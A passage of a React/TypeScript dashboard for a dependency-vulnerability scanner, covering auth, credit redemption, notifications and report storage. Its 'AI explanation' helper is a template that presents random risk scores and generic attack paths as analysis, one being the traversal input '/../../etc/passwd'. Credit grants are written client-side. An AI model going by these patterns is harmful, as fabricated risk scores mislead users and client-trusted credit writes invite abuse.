      setTelemetry(prev => [...prev, `[${ts}] Operator profile updated successfully in local sandboxed console.`, `[${ts}] Display Name set: ${nameVal}`]);
    } finally {
      setIsSavingProfile(false);
    }
  };

  const handleRequestCredits = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentUser) return;
    setIsSubmittingRequest(true);
    const requestPayload = {
      userId: currentUser.uid,
      displayName: userDoc?.displayName || currentUser.displayName || inferDisplayNameFromEmail(currentUser.email || ""),
      email: currentUser.email || "",
      currentPlan: isEnterprise ? "ENTERPRISE" : "STANDARD",
      availableCredits: userCredits,
      maxCredits: 250,
      requestedCredits: Number(requestCreditsAmt),
      reason: requestReason,
      projectName: requestProjectName || "N/A",
      status: "PENDING",
      createdAt: new Date().toISOString()
    };

    // Save locally
    try {
      const local = localStorage.getItem('cipherkavach_credit_requests');
      const existing = local ? JSON.parse(local) : [];
      localStorage.setItem('cipherkavach_credit_requests', JSON.stringify([requestPayload, ...existing]));
    } catch (err) {
      console.warn("Failed to save request locally:", err);
    }

    try {
      await addDoc(collection(db, "creditRequests"), {
        ...requestPayload,
        createdAt: serverTimestamp()
      });

      // Write audit log
      await addDoc(collection(db, "auditLogs"), {
        action: "REQUEST_CREDITS",
        target: `+${requestCreditsAmt} Credits`,
        detail: `Reason: ${requestReason}${requestProjectName ? ` | Project: ${requestProjectName}` : ""}`,
        actor: currentUser.email || "System Engine",
        timestamp: serverTimestamp()
      }).catch(e => console.warn("Audit log write failed due to permissions, proceeding:", e));

      // Runtime telemetries
      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Quota request submitted: +${requestCreditsAmt} AI Credits`, `[${ts}] Request status: PENDING REVIEW`]);
      triggerNotification(
        "Credit Request Registered",
        `Requested +${requestCreditsAmt} credits for project "${requestProjectName || 'Default'}". Status: PENDING.`,
        "request_approved",
        "info"
      );
    } catch (err) {
      console.warn("Firestore credit request write restricted (insufficient permissions), sandboxing locally:", err);

      triggerNotification(
        "Credit Request Registered",
        `Requested +${requestCreditsAmt} credits for project "${requestProjectName || 'Default'}". Status: PENDING (Sandboxed).`,
        "request_approved",
        "info"
      );

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Operator credit request registered successfully in local sandboxed console (Review: PENDING)`]);
    } finally {
      setRequestSuccess(true);
      setTimeout(() => {
        setShowRequestCreditsModal(false);
        setRequestSuccess(false);
        setRequestReason("");
        setRequestProjectName("");
      }, 2500);
      setIsSubmittingRequest(false);
    }
  };

  const handleRedeemCode = async () => {
    if (!currentUser || !redeemCode.trim()) return;
    const code = redeemCode.trim().toUpperCase();
    setRedeemStatus("loading");
    try {
      // Check Firestore runtimeCodes first (admin-generated), then fallback to hardcoded
      let benefit: { credits: number; enterprise: boolean; replayAccess: boolean; label: string } | null = null;
      const firestoreCodeRef = doc(db, "runtimeCodes", code);
      const firestoreSnap = await getDoc(firestoreCodeRef);
      if (firestoreSnap.exists()) {
        const d = firestoreSnap.data();
        if (d.active === false) { setRedeemStatus("error"); setRedeemMessage("This code has been deactivated."); return; }
        benefit = { credits: d.credits ?? 0, enterprise: d.enterprise ?? false, replayAccess: d.replayAccess ?? false, label: d.label ?? `+${d.credits} AI Credits` };
      } else {
        benefit = RUNTIME_CODES[code] ?? null;
      }
      if (!benefit) { setRedeemStatus("error"); setRedeemMessage("Invalid access code. Check your code and try again."); return; }
      const userRef = doc(db, "users", currentUser.uid);
      const snap = await getDoc(userRef);
      const userData = snap.exists() ? snap.data() : { credits: 50, redeemedCodes: [], enterpriseEnabled: false };
      const redeemed: string[] = userData.redeemedCodes || [];
      if (redeemed.includes(code)) { setRedeemStatus("error"); setRedeemMessage("Code already redeemed on this account."); return; }
      const newCredits = (userData.credits ?? 50) + benefit.credits;
      await setDoc(userRef, { ...userData, credits: newCredits, enterpriseEnabled: userData.enterpriseEnabled || benefit.enterprise, redeemedCodes: [...redeemed, code] }, { merge: true });
      await addDoc(collection(db, "redemptions"), {
        uid: currentUser.uid,
        userId: currentUser.uid,
        code,
        benefit: benefit.label,
        creditsGranted: benefit.credits,
        enterpriseUnlocked: benefit.enterprise,
        replayAccess: benefit.replayAccess,
        operatorEmail: currentUser.email || "",
        redeemedByEmail: userDoc?.displayName || currentUser.displayName || currentUser.email || "Unknown Operator",
        redeemedAt: serverTimestamp(),
        status: "REDEEMED",
        runtimeTier: benefit.enterprise ? "ENTERPRISE" : "STANDARD"
      });
      setUserCredits(newCredits);
      if (benefit.enterprise) setIsEnterprise(true);
      setRedeemStatus("success"); setRedeemMessage(benefit.label); setRedeemCode("");

      triggerNotification("License Key Activated", `Successfully redeemed key ${code} and loaded ${benefit.credits} AI credits to operator session.`, "code_redeemed", "success");
      if (benefit.enterprise) {
        triggerNotification("Enterprise Access Enabled", "Vulnerability propagation dashboard upgraded to enterprise grade.", "enterprise_enabled", "success");
      }

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Runtime access code redeemed: ${code}`, `[${ts}] ${benefit!.label} activated`, benefit!.enterprise ? `[${ts}] Enterprise runtime features enabled` : `[${ts}] Standard runtime credits loaded`]);
    } catch (e) { setRedeemStatus("error"); setRedeemMessage("Redemption failed. Please try again."); console.warn("Redemption restricted or failed:", e); }
  };

  const generateAdminCode = async () => {
    if (!isAdmin) return;
    setIsGenerating(true);
    try {
      const suffix = Math.random().toString(36).substring(2, 7).toUpperCase();
      const code = adminCodeName.trim().toUpperCase() || `CK-${suffix}`;
      const label = `${adminEnterprise ? "Enterprise" : "Standard"} · +${adminCredits} Credits`;
      await setDoc(doc(db, "runtimeCodes", code), {
        credits: adminCredits, enterprise: adminEnterprise, replayAccess: adminReplay,
        label, active: true, createdBy: currentUser!.email, createdAt: serverTimestamp(),
      });
      setGeneratedCodes(prev => [{ code, credits: adminCredits, enterprise: adminEnterprise }, ...prev.slice(0, 4)]);
      setAdminCodeName("");
    } catch (e) { console.warn("Code generation restricted or failed:", e); }
    finally { setIsGenerating(false); }
  };

  // Dynamic Security Trends Calculation
  const securityTrends = useMemo(() => {
    const recentScans = [...history].slice(0, 7).reverse();
    const maxVulns = Math.max(...recentScans.map(s => s.vulnerabilities?.length || 0), 1);

    return recentScans.map((scan) => {
      const count = (scan.vulnerabilities || [])?.length || 0;
      const heightPercent = count === 0 ? 15 : Math.max(20, Math.min(100, (count / maxVulns) * 100));

      let highestSeverity = "NONE";
      if ((scan.vulnerabilities || [])?.some(v => v.severity === "CRITICAL")) {
        highestSeverity = "CRITICAL";
      } else if ((scan.vulnerabilities || [])?.some(v => v.severity === "HIGH")) {
        highestSeverity = "HIGH";
      } else if ((scan.vulnerabilities || [])?.some(v => v.severity === "MEDIUM" || v.severity === "MODERATE")) {
        highestSeverity = "MEDIUM";
      } else if ((scan.vulnerabilities || [])?.length > 0) {
        highestSeverity = "LOW";
      }

      return {
        name: scan.repoMetadata?.name || "package.json",
        count,
        height: `${heightPercent}%`,
        severity: highestSeverity,
        date: new Date(scan.timestamp || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      };
    });
  }, [history]);

  // Dynamic AI Recommendations Calculation
  const aiRecommendations = useMemo(() => {
    const list: { type: "critical" | "warning" | "info"; msg: string }[] = [];
    const allScans = [...history];
    const allSaved = [...savedReports];
    const totalScans = allScans.length;

    const allVulns: Vuln[] = [];
    allScans.forEach(s => { if (s.vulnerabilities) allVulns.push(...s.vulnerabilities); });
    allSaved.forEach(s => { if (s.vulnerabilities) allVulns.push(...s.vulnerabilities); });

    // 1. Check for repeated vulnerable packages
    const pkgCounts: Record<string, number> = {};
    allVulns.forEach(v => {
      if (v.package) pkgCounts[v.package] = (pkgCounts[v.package] || 0) + 1;
    });

    const repeatedPkgs = Object.entries(pkgCounts)
      .sort((a, b) => b[1] - a[1])
      .filter(([_, count]) => count > 1);

    if (repeatedPkgs.length > 0) {
      const [topPkg, count] = repeatedPkgs[0];
      list.push({
        type: "critical",
        msg: `High ${topPkg} exposure detected across ${count} distinct security reports.`
      });
    }

    // 2. High severity trends
    const criticalVulns = allVulns.filter(v => v.severity === "CRITICAL");
    const highVulns = allVulns.filter(v => v.severity === "HIGH");

    if (criticalVulns.length > 0) {
      list.push({
        type: "critical",
        msg: `Urgent mitigation needed: ${criticalVulns.length} critical CVE vectors detected in active runtime environment.`
      });
    } else if (highVulns.length > 0) {
      list.push({
        type: "warning",
        msg: `Multiple HIGH severity dependency chains detected. Run automated remediation patches.`
      });
    }

    // 3. Saved reports threat models
    if (allSaved.length > 0) {
      list.push({
        type: "info",
        msg: `Replay execution frequency increased: ${allSaved.length} threat models saved to enterprise registry.`
      });
    }

    // 4. Low credit warnings
    if (!isAdmin && userCredits > 0 && userCredits <= 5) {
      list.push({
        type: "warning",
        msg: `Low system credits remaining (${userCredits}). Request additional AI quota immediately.`
      });
    }

    // 5. Enterprise dynamic compliance
    if (isEnterprise) {
      list.push({
        type: "info",
        msg: "Enterprise compliance baseline active: Detailed risk propagation graphs compiled."
      });
    }

    // 6. Generic smart fallbacks / security recommendations
    if (list.length < 2) {
      if (totalScans === 0) {
        list.push({
          type: "info",
          msg: "Run additional scans to build runtime threat intelligence."
        });
        list.push({
          type: "info",
          msg: "Vulnerability propagation engine ready. Upload a package.json to start."
        });
      } else {
        list.push({
          type: "info",
          msg: "Vulnerability baseline is healthy. Continuously check for new zero-day releases."
        });
        list.push({
          type: "info",
          msg: "Enable periodic dependency analysis to prevent regression risk."
        });
      }
    }

    return list.slice(0, 3);
  }, [history, savedReports, isEnterprise, userCredits, isAdmin]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(text);
    setTimeout(() => setCopiedCode(""), 2000);
  };

  const handleEmailAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError("");
    setIsSigningIn(true);

    // 1. Email Normalization & Validation
    const normalizedEmail = authEmail.trim().toLowerCase();
    if (!normalizedEmail) {
      setAuthError("Email address is required.");
      setIsSigningIn(false);
      return;
    }
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(normalizedEmail)) {
      setAuthError("Please enter a valid email address (e.g. user@example.com).");
      setIsSigningIn(false);
      return;
    }
    const parts = normalizedEmail.split("@");
    const domain = parts[1] || "";
    if (!domain.includes(".") || domain.startsWith(".") || domain.endsWith(".")) {
      setAuthError("Invalid email domain structure.");
      setIsSigningIn(false);
      return;
    }

    // 2. Password Validation
    if (!authPassword) {
      setAuthError("Password is required.");
      setIsSigningIn(false);
      return;
    }
    if (authPassword.length < 8) {
      setAuthError("Password must be at least 8 characters long.");
      setIsSigningIn(false);
      return;
    }
    const hasUpper = /[A-Z]/.test(authPassword);
    const hasLower = /[a-z]/.test(authPassword);
    const hasNumber = /[0-9]/.test(authPassword);
    if (!hasUpper || !hasLower || !hasNumber) {
      setAuthError("Password must include at least: 1 uppercase letter, 1 lowercase letter, and 1 number.");
      setIsSigningIn(false);
      return;
    }
    const weakPasswords = ["123456", "12345678", "password", "qwerty", "admin", "12345", "abc123", "password123", "cipherkavach", "123456789"];
    if (weakPasswords.includes(authPassword.toLowerCase())) {
      setAuthError("Password is too weak or commonly used. Please choose a more secure password.");
      setIsSigningIn(false);
      return;
    }

    try {
      if (authMode === "signup") {
        // 3. Signup Full Name Validation
        if (!authFullName.trim()) {
          setAuthError("Full name is required.");
          setIsSigningIn(false);
          return;
        }
        const nameRegex = /^[a-zA-Z\s]{2,50}$/;
        if (!nameRegex.test(authFullName.trim())) {
          setAuthError("Please enter a valid full name (letters and spaces only, 2-50 characters).");
          setIsSigningIn(false);
          return;
        }

        // Register the new user
        const credential = await createUserWithEmailAndPassword(auth, normalizedEmail, authPassword);
        const user = credential.user;

        // Save profile in Firebase auth
        await updateProfile(user, { displayName: authFullName.trim() });

        // Save initial user doc in Firestore
        const nowStr = new Date().toISOString();
        const calculateResetDate = () => {
          const d = new Date();
          d.setDate(d.getDate() + 31);
          return d.toISOString();
        };
        const isAdminUser = normalizedEmail === ADMIN_EMAIL;

        const defaultDoc = {
          uid: user.uid,
          email: normalizedEmail,
          displayName: authFullName.trim(),
          avatarUrl: `https://ui-avatars.com/api/?name=${encodeURIComponent(authFullName.trim())}&background=0f1219&color=60a5fa&size=128`,
          role: isAdminUser ? "ADMIN" : "operator",
          credits: isAdminUser ? 9999 : 50,
          enterpriseEnabled: isAdminUser,
          redeemedCodes: [],
          registeredAt: nowStr,
          createdAt: nowStr,
          nextResetAt: calculateResetDate(),
          demoScansUsed: 0,
          totalScans: 0,
          lastScanAt: null,
          plan: isAdminUser ? "ENTERPRISE" : "FREE"
        };

        try {
          await setDoc(doc(db, "users", user.uid), defaultDoc);
        } catch (setErr) {
          console.warn("Initial signup Firestore save failed:", setErr);
        }

        setShowAuthModal(false);
      } else {
        // Log in
        await signInWithEmailAndPassword(auth, normalizedEmail, authPassword);
        setShowAuthModal(false);
      }
    } catch (err: unknown) {
      const code = (err as { code?: string }).code;
      console.warn("Authentication warning:", err);
      if (code === "auth/email-already-in-use") {
        setAuthError("Email already registered. Try signing in.");
      } else if (code === "auth/wrong-password" || code === "auth/invalid-credential" || code === "auth/user-not-found") {
        setAuthError("Account not found. Create a new account to continue.");
      } else if (code === "auth/weak-password") {
        setAuthError("Password must be at least 8 characters long and meet secure standards.");
      } else if (code === "auth/invalid-email") {
        setAuthError("Invalid email address format.");
      } else {
        setAuthError((err as { message?: string }).message || "Authentication failed. Try again.");
      }
    } finally {
      setIsSigningIn(false);
    }
  };

  const getAIExplanation = (vuln: ExplainVulnData) => {
    const id = vuln.id || "CVE-UNKNOWN";
    const pkg = vuln.packageName || "unknown";
    const sev = vuln.severity?.toUpperCase() || "HIGH";

    // Compute score based on severity and details
    let score = 75;
    if (sev === "CRITICAL") score = 92 + Math.floor(Math.random() * 7);
    else if (sev === "HIGH") score = 80 + Math.floor(Math.random() * 10);
    else if (sev === "MEDIUM" || sev === "MODERATE") score = 60 + Math.floor(Math.random() * 15);
    else score = 40 + Math.floor(Math.random() * 15);

    // Dynamic narration
    let summary = vuln.description || `This instance represents a severe data mutation exposure identified within the ${pkg} package dependency tree. If unpatched, this vulnerability can expose the hosting runtime environment.`;
    let mechanism = `Exploits target the transient parameters of the exposed modules, bypassing standard verification boundaries or using prototype mutation chains to inject arbitrary execution queries.`;
    let attackPath = `External Attacker ➔ Target Route Ingress ➔ Dependency Parsing Context (${pkg}) ➔ Remote Command Execution / Data Egress`;
    let impact = `Critical compromise of hosting application namespace, unauthorized access to secure operational registers, and potential privilege escalation leading to full node acquisition.`;
    let remediation = `Immediately upgrade ${pkg} to the latest stable patch release. Ensure active routing boundaries are filtered using CascadeFlow WAF middleware configurations.`;

    if (id.includes("2023") || id.includes("2024")) {
      summary = `Modern exploit vector exposing serialization interfaces in ${pkg}. Insecure structural parsing triggers unexpected behavior in the Node memory state.`;
    }

    if (pkg.toLowerCase().includes("lodash") || vuln.description?.toLowerCase().includes("prototype")) {
      mechanism = `Object mutation algorithms (like merge or defaults) in ${pkg} are targetable via deep parameter queries containing __proto__ or constructor keys, altering built-in prototype behavior.`;
      attackPath = `Malicious Egress Input ➔ JSON.parse Parser ➔ Lodash object merger ➔ Object prototype altered ➔ Arbitrary property injection ➔ Privilege Escalation`;
      remediation = `Pin lodash version to >= 4.17.21. Implement deep freeze guards on system configurations.`;
    } else if (pkg.toLowerCase().includes("vite") || pkg.toLowerCase().includes("webpack") || vuln.description?.toLowerCase().includes("denial")) {
      mechanism = `High-frequency thread block via unoptimized regex parsing or recursion. Overloads event-loop pipelines immediately.`;
      attackPath = `Rapid Egress Requests ➔ Ingress Handler ➔ Unhandled regex execution ➔ Thread starvation ➔ Service denial`;
      remediation = `Configure aggressive input size limits. Deploy reverse-proxy rate limiting boundaries.`;
    } else if (pkg.toLowerCase().includes("express") || vuln.description?.toLowerCase().includes("path") || vuln.description?.toLowerCase().includes("directory")) {
      mechanism = `Directory traversal utilizing relative paths (../) inside route resolving middlewares. Bypass path normalizer checks.`;
      attackPath = `Target request URL (/../../etc/passwd) ➔ Express route middleware ➔ Inadequate normalizer ➔ Host file disclosure`;
      remediation = `Verify absolute resolved paths remain contained inside the target static directories.`;
    }

    return {
      score,
      summary,
      mechanism,
      attackPath,
      impact,
      remediation
    };
  };

  const handleOpenExplainModal = (vuln: ExplainVulnData) => {
    setExplainVuln(vuln);
    setExplainLoading(true);
    setTimeout(() => {
      setExplainLoading(false);
    }, 1200);
  };

  const handleDemoAccess = async () => {
    setAuthError("");
    setIsSigningIn(true);
    try {
      await signInWithEmailAndPassword(auth, DEMO_EMAIL, DEMO_PASSWORD);
      setShowAuthModal(false);
    } catch (err: unknown) {
      const code = (err as { code?: string }).code;
      if (code === "auth/user-not-found" || code === "auth/invalid-credential") {
        try { await createUserWithEmailAndPassword(auth, DEMO_EMAIL, DEMO_PASSWORD); setShowAuthModal(false); }
        catch (e2: unknown) { setAuthError((e2 as { message?: string }).message || "Demo setup failed."); }
      } else { setAuthError("Demo access failed. Please try Google login."); }
    } finally { setIsSigningIn(false); }
  };

  // Load user notifications with Firestore + local sandboxing fallback
  const loadNotifications = useCallback(async (uid: string) => {
    let list: NotificationItem[] = [];
    try {
      console.log(`[Firestore Audit] Querying "notifications" for userId == "${uid}"`);
      const q = query(collection(db, "notifications"), where("userId", "==", uid));
      const snap = await getDocs(q);
      console.log(`[Firestore Audit] "notifications" query successful. Snapshot size: ${snap.size}`);
      list = snap.docs.map(d => ({ id: d.id, ...d.data() } as any));
      // Sort client-side to avoid composite indexing requirements
      const getMs = (val: any) => {
        if (!val) return 0;
        if (typeof val.toDate === "function") return val.toDate().getTime();
        if (val.seconds) return val.seconds * 1000;
        const d = new Date(val);
        return isNaN(d.getTime()) ? 0 : d.getTime();
      };
      list.sort((a, b) => getMs(b.createdAt) - getMs(a.createdAt));
    } catch (e) {
      console.error(`[Firestore Audit] Failed to query "notifications":`, e);
      console.warn("Firestore notifications load restricted, using local sandbox fallback:", e);
    }

    // Always merge with local sandboxed notifications
    try {
      const local = localStorage.getItem(`cipherkavach_notifications_${uid}`);
      const localList: NotificationItem[] = local ? JSON.parse(local) : [];

      // Combine lists and deduplicate by id
      const combined = [...list, ...localList];
      const uniqueMap: Record<string, NotificationItem> = {};
      combined.forEach(n => {
        if (n && n.id) uniqueMap[n.id] = n;
      });

      const finalSorted = Object.values(uniqueMap).sort(
        (a, b) => new Date(b.createdAt || 0).getTime() - new Date(a.createdAt || 0).getTime()
      );
      setNotifications(finalSorted);
    } catch (err) {
      console.warn("Failed to load local sandboxed notifications:", err);
    }
  }, []);

  // Trigger/Add notification programmatically
  const triggerNotification = async (
    title: string,
    message: string,
    category: NotificationItem["category"],
    severity: NotificationItem["severity"]
  ) => {
    if (!currentUser) return;

    // Deduplicate: avoid repeating exact active alerts
    const alreadyExists = (notifications || []).some(n => n.title === title && !n.read);
    if (alreadyExists) return;

    const uid = currentUser.uid;
    const newId = "notif_" + Math.random().toString(36).substring(2, 11);

    const item: Omit<NotificationItem, "id"> = {
      userId: uid,
      title,
      message,
      category,
      severity,
      read: false,
      createdAt: new Date().toISOString()
    };

    // Attempt to persist to Firestore
    try {
      const docRef = doc(collection(db, "notifications"));
      await setDoc(docRef, item);
      console.log("Notification saved persistently to Firestore.");
    } catch (e) {
      console.warn("Firestore notification save failed, falling back to local sandbox storage:", e);
      // Persist to localStorage sandbox
      try {
        const local = localStorage.getItem(`cipherkavach_notifications_${uid}`);
        const localList: NotificationItem[] = local ? JSON.parse(local) : [];
        const fullItem: NotificationItem = { id: newId, ...item };
        localList.push(fullItem);
        localStorage.setItem(`cipherkavach_notifications_${uid}`, JSON.stringify(localList));
      } catch (err) {
        console.error("Local storage notification write failed:", err);
      }
    }

    // Reload state
    loadNotifications(uid);
  };

  // Mark a single notification as read
  const markNotificationRead = async (id: string) => {
    if (!currentUser) return;
    const uid = currentUser.uid;

    // Check if it's in localStorage
    if (id.startsWith("notif_")) {
      try {
        const local = localStorage.getItem(`cipherkavach_notifications_${uid}`);
        const localList: NotificationItem[] = local ? JSON.parse(local) : [];
        const updated = localList.map(n => n.id === id ? { ...n, read: true } : n);
        localStorage.setItem(`cipherkavach_notifications_${uid}`, JSON.stringify(updated));
      } catch (err) {
        console.warn(err);
      }
    } else {
      // Persist to Firestore
      try {
        await updateDoc(doc(db, "notifications", id), { read: true });
      } catch (e) {
        console.warn("Firestore notification update failed, updating sandbox copy:", e);
        // Fallback local update
        setNotifications(prev => prev.map(n => n.id === id ? { ...n, read: true } : n));
      }
    }
    loadNotifications(uid);
  };

  // Clear single notification
  const clearNotification = async (id: string) => {
    if (!currentUser) return;
    const uid = currentUser.uid;

    if (id.startsWith("notif_")) {
      try {
        const local = localStorage.getItem(`cipherkavach_notifications_${uid}`);
        const localList: NotificationItem[] = local ? JSON.parse(local) : [];
        const filtered = localList.filter(n => n.id !== id);
        localStorage.setItem(`cipherkavach_notifications_${uid}`, JSON.stringify(filtered));
      } catch (err) {
        console.warn(err);
      }
    } else {
      try {
        await deleteDoc(doc(db, "notifications", id));
      } catch (e) {
        console.warn("Firestore delete blocked, filtering client-side:", e);
      }
    }
    loadNotifications(uid);
  };

  // Clear all notifications
  const clearAllNotifications = async () => {
    if (!currentUser) return;
    const uid = currentUser.uid;

    // Clear local storage notifications
    try {
      localStorage.removeItem(`cipherkavach_notifications_${uid}`);
    } catch (err) {
      console.warn(err);
    }

    // Fetch and delete Firestore notifications
    try {
      const q = query(collection(db, "notifications"), where("userId", "==", uid));
      const snap = await getDocs(q);
      const deletePromises = snap.docs.map(d => deleteDoc(doc(db, "notifications", d.id)));
      await Promise.all(deletePromises);
    } catch (e) {
      console.warn("Firestore notification clear all restricted:", e);
    }

    loadNotifications(uid);
  };

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      setCurrentUser(user);
      setIsAuthLoading(false);
      if (user) {
        setIsProfileLoading(true);
        fetchFirebaseHistory(user.uid);
        loadUserCredits(user.uid);
        loadSavedReports(user.uid);
        loadNotifications(user.uid);
        if (user.email === DEMO_EMAIL) {
          seedDemoUserDataForUID(user.uid);
        }
      } else {
        setIsProfileLoading(false);
        router.push("/");
      }
    });
    return () => unsubscribe();
  }, [router, loadNotifications]);

  const loadSavedReports = useCallback(async (uid: string) => {
    setSavedReportsLoading(true);
    let firestoreList: any[] = [];
    try {
      console.log(`[Firestore Audit] Querying "savedReports" for userId == "${uid}"`);
      const q = query(collection(db, "savedReports"), where("userId", "==", uid));
      const snap = await getDocs(q);
      console.log(`[Firestore Audit] "savedReports" query successful. Snapshot size: ${snap.size}`);
      firestoreList = snap.docs.map(d => ({ id: d.id, ...d.data() } as any));
    } catch (e) {
      console.error(`[Firestore Audit] Failed to query "savedReports":`, e);
      console.warn("Failed to load saved reports from Firestore (permissions or connection):", e);
      setFirestoreRestricted(true);
    }

    // Load local sandboxed reports
    let localList: any[] = [];
    try {
      const local = localStorage.getItem('cipherkavach_saved_reports');
      localList = local ? JSON.parse(local) : [];
    } catch (e) {
      console.warn("Failed to parse local storage saved reports:", e);
    }

    // Combine lists, preferring firestore items where IDs match, and avoiding duplicate items
    const combined = [...firestoreList];
    localList.forEach((item: any) => {
      if (!(combined || []).some(c => c.id === item.id || (c.repoName === item.repoName && c.createdAt === item.createdAt))) {
        combined.push(item);
      }
    });

    // Cleanly sort chronologically (handling both server timestamps and local strings/dates)
    combined.sort((a, b) => {
      const aTime = a.createdAt?.toDate?.() ? a.createdAt.toDate().getTime() : new Date(a.createdAt || 0).getTime();
      const bTime = b.createdAt?.toDate?.() ? b.createdAt.toDate().getTime() : new Date(b.createdAt || 0).getTime();
      return bTime - aTime;
    });

    setSavedReports(combined);
    setSavedReportsLoading(false);
  }, []);

  const handleSaveReport = async () => {
    if (!currentUser || !scanResult) return;
    setIsSavingReportData(true);
    const repoName = scanResult.repoMetadata?.name || "package.json";
    const vulnerabilities = scanResult.vulnerabilities || [];

    let severity = "LOW";
    if ((vulnerabilities || []).some(v => v.severity === "CRITICAL")) {
      severity = "CRITICAL";
    } else if ((vulnerabilities || []).some(v => v.severity === "HIGH")) {
      severity = "HIGH";
    } else if ((vulnerabilities || []).some(v => v.severity === "MODERATE" || v.severity === "MEDIUM")) {
      severity = "MEDIUM";
    }

    const localId = "local_" + Date.now();
    const reportPayload = {
      id: localId,
      userId: currentUser.uid,
      displayName: userDoc?.displayName || currentUser.displayName || inferDisplayNameFromEmail(currentUser.email || ""),
      email: currentUser.email || "",
      repoName,
      vulnerabilities,
      severity,
      overall_ai_summary: scanResult.overall_ai_summary || "No overall AI summary available.",
      remediation_script: scanResult.remediation_script || "",
      exploit_simulation: scanResult.exploit_simulation || "",
      patch_priority: scanResult.patch_priority || null,
      impact_analysis: scanResult.impact_analysis || "",
      progression_timeline: scanResult.progression_timeline || null,
      trust_score: scanResult.trust_score || null,
      telemetry: scanResult.telemetry || [],
      replayAvailable: true,
      createdAt: new Date().toISOString()
    };

    // Save to local storage first (Optimistic Sync)
    let updatedLocalList: any[] = [];
    try {
      const local = localStorage.getItem('cipherkavach_saved_reports');
      const existing = local ? JSON.parse(local) : [];
      updatedLocalList = [reportPayload, ...existing];
      localStorage.setItem('cipherkavach_saved_reports', JSON.stringify(updatedLocalList));
    } catch (e) {
      console.error("Local storage save failed:", e);
    }

    // Instantly update local state for real-time responsiveness
    setSavedReports(prev => {
      const filtered = prev.filter(r => r.id !== localId);
      return [reportPayload, ...filtered];
    });

    try {
      // Attempt Firestore persist (ignoring client-side id in payload for firestore storage)
      const { id, ...firestorePayload } = reportPayload;
      const docRef = await addDoc(collection(db, "savedReports"), {
        ...firestorePayload,
        createdAt: serverTimestamp() // real server timestamp
      });

      // Update local storage ID to match docRef.id
      try {
        const local = localStorage.getItem('cipherkavach_saved_reports');
        if (local) {
          const parsed = JSON.parse(local);
          const finalLocal = parsed.map((r: any) => r.id === localId ? { ...r, id: docRef.id } : r);
          localStorage.setItem('cipherkavach_saved_reports', JSON.stringify(finalLocal));
        }
      } catch (e) {
        console.warn("Failed to update ID in local storage:", e);
      }

      // Update state item ID to match docRef.id
      setSavedReports(prev => prev.map(r => r.id === localId ? { ...r, id: docRef.id } : r));

      // Attempt audit log
      await addDoc(collection(db, "auditLogs"), {
        action: "REPORT_SAVED",
        target: repoName,
        detail: `Runtime report saved successfully (ID: ${docRef.id})`,
        actor: currentUser.email || "System Engine",
        timestamp: serverTimestamp()
      }).catch(e => console.warn("Failed to write audit log due to permissions, proceeding:", e));

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Intelligence report saved to persistent registry (ID: ${docRef.id})`]);

      setSaveReportSuccess(true);
      setTimeout(() => setSaveReportSuccess(false), 3000);
    } catch (e) {
      console.warn("Firestore save failed or restricted (Missing or insufficient permissions), using sandboxed local storage:", e);
      setFirestoreRestricted(true);

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Intelligence report saved successfully to sandboxed operator storage`]);

      setSaveReportSuccess(true);
      setTimeout(() => setSaveReportSuccess(false), 3000);
    } finally {
      setIsSavingReportData(false);
      loadSavedReports(currentUser.uid);
    }
  };

  const handleDeleteReport = async () => {
    if (!currentUser || !reportToDelete) return;
    setIsDeletingReport(true);

    const targetId = reportToDelete.id;
    const targetType = reportToDelete.type;
    const targetName = reportToDelete.repoName;

    // Optimistic UI and local storage update
    if (targetType === "saved") {
      try {
        const local = localStorage.getItem('cipherkavach_saved_reports');
        if (local) {
          const filtered = JSON.parse(local).filter((r: any) => r.id !== targetId);
          localStorage.setItem('cipherkavach_saved_reports', JSON.stringify(filtered));
          setSavedReports(filtered);
        } else {
          setSavedReports(prev => prev.filter(r => r.id !== targetId));
        }
      } catch (e) {
        setSavedReports(prev => prev.filter(r => r.id !== targetId));
      }
    } else {
      setHistory(prev => prev.filter(r => r.timestamp !== targetId));
    }

    try {
      if (targetType === "saved") {
        // Only delete from Firestore if it is a real Firestore document (not local_ prefixed)
        if (!targetId.startsWith("local_")) {
          await deleteDoc(doc(db, "savedReports", targetId));
        }
      } else {
        const q = query(collection(db, "scans"), where("userId", "==", currentUser.uid), where("timestamp", "==", targetId));
        const snap = await getDocs(q);
        if (!snap.empty) {
          await deleteDoc(doc(db, "scans", snap.docs[0].id));
        }
      }

      // Attempt audit log
      await addDoc(collection(db, "auditLogs"), {
        action: "REPORT_DELETED",
        target: targetName,
        detail: `Runtime report deleted successfully (ID: ${targetId})`,
        actor: currentUser.email || "System Engine",
        timestamp: serverTimestamp()
      }).catch(e => console.warn("Failed to write audit log due to permissions, proceeding:", e));

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Intelligence report deleted from registry (ID: ${targetId})`]);

      setReportToDelete(null);
    } catch (e) {
      console.warn("Firestore delete failed (permissions or offline), local database updated successfully:", e);
      setFirestoreRestricted(true);

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Intelligence report deleted successfully from sandboxed operator storage`]);

      setReportToDelete(null);
    } finally {
      setIsDeletingReport(false);
